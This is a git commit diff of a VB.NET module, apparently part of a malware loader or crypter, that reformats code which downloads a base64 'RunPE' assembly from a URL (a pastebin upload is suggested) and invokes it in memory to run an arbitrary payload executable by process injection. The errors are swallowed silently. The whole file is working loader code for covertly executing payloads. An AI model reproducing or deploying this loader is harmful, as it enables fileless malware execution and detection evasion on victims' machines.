39da3aba02159ebcc76b99db49f751574870db0c
Bihel29 <46978496+Bihel29@users.noreply.github.com>
2020-05-20 12:28:03 +0200

    Update Module.vb

--- Module.vb
+++ Module.vb
@@ -1,25 +1,26 @@
   'Upload RunPE to pastebin and replace the URL
+  '
   'Usage :
-  
+  '
   'Dim Payload As Byte() = IO.Files.ReadAllBytes("C:\YourPayload.exe")
   'Dim Payload As Byte() = My.Resources.YourPayload
   '
   'Load(Payload)
 
 
-  Public Sub Load(ByVal Payload As Byte())
-        Try
-        Assembly.Load(LoadFile("http://127.0.0.1/RunPE.txt")).GetType("RunPE.Run").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
-        Catch
-        End Try
-  End Sub
+Public Shared Sub Load(ByVal Payload As Byte())
+  Try
+    Assembly.Load(LoadFile("http://127.0.0.1/RunPE.txt")).GetType("RunPE.Run").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
+  Catch
+  End Try
+End Sub
     
-    Public Shared Function LoadFile(ByVal url As String) As Byte()
-        Try
-            Dim WC As New WebClient
-            Dim WB As String = WC.DownloadString(url)
-            Return Convert.FromBase64String(WB)
-        Catch
-            Return Nothing
-        End Try
-    End Function
+Public Shared Function LoadFile(ByVal url As String) As Byte()
+  Try
+    Dim WC As New WebClient
+    Dim WB As String = WC.DownloadString(url)
+    Return Convert.FromBase64String(WB)
+  Catch
+    Return Nothing
+  End Try
+End Function
